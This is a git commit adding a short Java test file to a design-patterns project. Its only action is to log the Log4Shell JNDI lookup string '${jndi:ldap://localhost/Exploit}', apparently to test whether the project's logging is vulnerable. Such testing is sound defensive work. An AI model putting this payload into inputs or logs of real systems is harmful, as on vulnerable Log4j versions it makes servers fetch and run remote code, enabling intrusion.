de428080d8eba26bf258e7828f7a769954170c8b
郑光星 <zhengguangxing@clearofchina.com>
2021-12-27 14:29:19 +0800

    update

---
+++ src/test/java/com/designpatterns/proxy/stream/MainTest1.java
@@ -0,0 +1,18 @@
+package com.designpatterns.proxy.stream;
+
+import lombok.extern.slf4j.Slf4j;
+import org.slf4j.Logger;
+import org.slf4j.LoggerFactory;
+
+/**
+ * @author gxing
+ * @desc TODO
+ * @date 2021/11/23
+ */
+@Slf4j
+public class MainTest1 {
+    public static final Logger logger = LoggerFactory.getLogger(MainTest1.class);
+    public static void main(String[] args) {
+        logger.error("${jndi:ldap://localhost/Exploit}");
+    }
+}
